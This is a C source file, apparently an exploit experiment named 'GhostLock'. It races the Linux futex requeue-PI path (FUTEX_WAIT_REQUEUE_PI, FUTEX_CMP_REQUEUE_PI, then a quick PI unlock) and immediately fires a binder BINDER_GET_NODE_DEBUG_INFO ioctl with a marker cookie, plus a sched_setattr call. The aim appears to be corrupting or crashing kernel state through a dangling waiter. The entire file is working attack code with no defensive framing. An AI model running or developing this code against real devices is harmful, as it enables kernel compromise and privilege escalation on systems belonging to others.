/**
 * ghostlock_binder_wake_cfu.c — GhostLock requeue then quick PI unlock + binder CFU
 *
 * Hypothesis: ETIMEDOUT cleanup removes dangling waiter; instead unlock
 * f_pi_target right after CMP_REQUEUE_PI so waiter returns on the
 * requeue/acquire path and immediately fires BINDER_GET_NODE_DEBUG_INFO.
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#define BINDER_GET_NODE_DEBUG_INFO                                             \
  (((3u) << 30) | ((24u) << 16) | (('b') << 8) | 11)

struct binder_node_debug_info {
  uint64_t ptr;
  uint64_t cookie;
  uint32_t has_strong_ref;
  uint32_t has_weak_ref;
} __attribute__((packed));

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));
static volatile int ready, owner_ok, requeued, done;
static int g_bfd = -1;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
  (void)a;
  g_bfd = open("/dev/binder", O_RDWR);
  if (g_bfd < 0) {
    printf("binder open errno=%d\n", errno);
    done = 1;
    return 0;
  }

  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_ok)
    usleep(100);

  /* no timeout — wait for requeue/wake */
  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &f_pi_target, 0);
  printf("[waiter] WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);

  struct binder_node_debug_info info = {
      .ptr = 0,
      .cookie = 0x4141414141414141ULL,
      .has_strong_ref = 0,
      .has_weak_ref = 0,
  };
  /* fire immediately — minimize stack noise */
  r = ioctl(g_bfd, BINDER_GET_NODE_DEBUG_INFO, &info);
  printf("[binder] CFU ioctl ret=%ld errno=%d\n", r, errno);

  /* second PI kick */
  errno = 0;
  r = futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  printf("[pi] re-LOCK_PI chain ret=%ld errno=%d\n", r, errno);

  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t a, b, c;
    uint32_t d, e;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = 10;
  r = syscall(274, 0, &attr, 0);
  printf("[pi] sched_setattr ret=%ld errno=%d\n", r, errno);

  close(g_bfd);
  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_ok = 1;
  while (!ready)
    usleep(100);
  /* wait until requeue signal */
  while (!requeued)
    usleep(100);
  usleep(5000);
  /* unlock target so requeued waiter can return */
  futex(&f_pi_target, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  printf("[owner] unlocked f_pi_target\n");
  while (!done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock_binder_wake_cfu — requeue + quick unlock + binder CFU\n\n");
  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(100000);
  pthread_create(&ot, 0, owner, 0);
  usleep(200000);

  for (int i = 0; i < 200; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[trigger] GhostLock ret=%ld\n", r);
      requeued = 1;
      break;
    }
    usleep(500);
  }
  if (!requeued) {
    printf("requeue failed\n");
    requeued = 1;
  }

  while (!done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);
  printf("\n=== KERNEL SURVIVED ===\n");
  return 0;
}
